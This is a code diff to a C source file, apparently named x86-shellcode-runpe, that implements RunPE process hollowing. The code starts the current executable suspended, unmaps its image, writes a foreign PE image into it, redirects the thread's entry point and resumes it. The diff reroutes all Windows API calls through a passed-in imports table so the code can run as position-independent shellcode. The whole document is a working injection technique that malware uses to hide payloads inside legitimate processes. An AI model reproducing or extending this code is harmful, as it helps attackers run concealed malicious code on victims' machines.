@@ -4,7 +4,7 @@
 #include "x86-shellcode-runpe.h"
 
 int
-runpe(PBYTE* pe_image)
+runpe(struct dll_imports *imports, PBYTE* pe_image)
 {
   int ret = 0;
 
@@ -22,7 +22,7 @@ runpe(PBYTE* pe_image)
 
   libc_memset(&cur_proc_path, 0, sizeof cur_proc_path);
 
-  if (!GetModuleFileNameW(NULL, cur_proc_path, MAX_PATH)) {
+  if (!imports->GetModuleFileNameW(NULL, cur_proc_path, MAX_PATH)) {
     return -1;
   }
 
@@ -34,8 +34,8 @@ runpe(PBYTE* pe_image)
 
   start_info.cb = sizeof start_info;
 
-  if (!CreateProcessW(cur_proc_path,
-                      GetCommandLineW(),
+  if (!imports->CreateProcessW(cur_proc_path,
+                      imports->GetCommandLineW(),
                       NULL,
                       NULL,
                       FALSE,
@@ -52,14 +52,14 @@ runpe(PBYTE* pe_image)
 
   thread_ctx.ContextFlags = CONTEXT_FULL;
 
-  if (!GetThreadContext(proc_info.hThread, &thread_ctx)) {
+  if (!imports->GetThreadContext(proc_info.hThread, &thread_ctx)) {
     ret = -3;
     goto kill_process;
   }
 
   PVOID p_remote_base;
 
-  if (!ReadProcessMemory(
+  if (!imports->ReadProcessMemory(
         proc_info.hProcess,
         /*
           Ebx is the foreign process PEB structure address.
@@ -79,11 +79,8 @@ runpe(PBYTE* pe_image)
     goto kill_process;
   }
 
-  ZwUnmapViewOfSection* fZwUnmapViewOfSection =
-    get_export_address(get_module_base(L"ntdll.dll"), "ZwUnmapViewOfSection");
-
-  fZwUnmapViewOfSection(proc_info.hProcess, p_remote_base);
-
+  imports->ZwUnmapViewOfSection(proc_info.hProcess, p_remote_base);
+  
   /*
     We are allocating at the base address the image wants to run at
     without rebasing it with it's relocation directory if it has one.
@@ -113,7 +110,8 @@ runpe(PBYTE* pe_image)
     There will be some cases where it will not be possible to load the image.
   */
 
-  PBYTE p_mapped = VirtualAllocEx(proc_info.hProcess,
+  PBYTE p_mapped =
+    imports->VirtualAllocEx(proc_info.hProcess,
                                   (PVOID)p_nt->OptionalHeader.ImageBase,
                                   p_nt->OptionalHeader.SizeOfImage,
                                   MEM_COMMIT | MEM_RESERVE,
@@ -123,7 +121,7 @@ runpe(PBYTE* pe_image)
     goto kill_process;
   }
 
-  if (!WriteProcessMemory(proc_info.hProcess,
+  if (!imports->WriteProcessMemory(proc_info.hProcess,
                           p_mapped,
                           pe_image,
                           p_nt->OptionalHeader.SizeOfHeaders,
@@ -132,7 +130,7 @@ runpe(PBYTE* pe_image)
     goto kill_process;
   }
   for (size_t i = 0; i < p_nt->FileHeader.NumberOfSections; ++i) {
-    if (!WriteProcessMemory(proc_info.hProcess,
+    if (!imports->WriteProcessMemory(proc_info.hProcess,
                             p_mapped + p_sections[i].VirtualAddress,
                             pe_image + p_sections[i].PointerToRawData,
                             p_sections[i].SizeOfRawData,
@@ -146,7 +144,7 @@ runpe(PBYTE* pe_image)
     TODO: Figure out protection flags and set them on the mapped image sections.
   */
 
-  if (!WriteProcessMemory(
+  if (!imports->WriteProcessMemory(
         proc_info.hProcess,
         /*
           Ebx is the foreign process PEB structure address.
@@ -167,12 +165,12 @@ runpe(PBYTE* pe_image)
 
   thread_ctx.Eax = (DWORD)(pe_image + p_nt->OptionalHeader.AddressOfEntryPoint);
 
-  if (!SetThreadContext(proc_info.hThread, &thread_ctx)) {
+  if (!imports->SetThreadContext(proc_info.hThread, &thread_ctx)) {
     ret = -9;
     goto kill_process;
   }
 
-  if (!ResumeThread(proc_info.hThread)) {
+  if (!imports->ResumeThread(proc_info.hThread)) {
     ret = -10;
     goto kill_process;
   }
@@ -180,8 +178,8 @@ runpe(PBYTE* pe_image)
   return 0;
 
 kill_process:
-  TerminateProcess(proc_info.hProcess, -1);
-  CloseHandle(proc_info.hThread);
-  CloseHandle(proc_info.hProcess);
+  imports->TerminateProcess(proc_info.hProcess, -1);
+  imports->CloseHandle(proc_info.hThread);
+  imports->CloseHandle(proc_info.hProcess);
   return ret;
 }
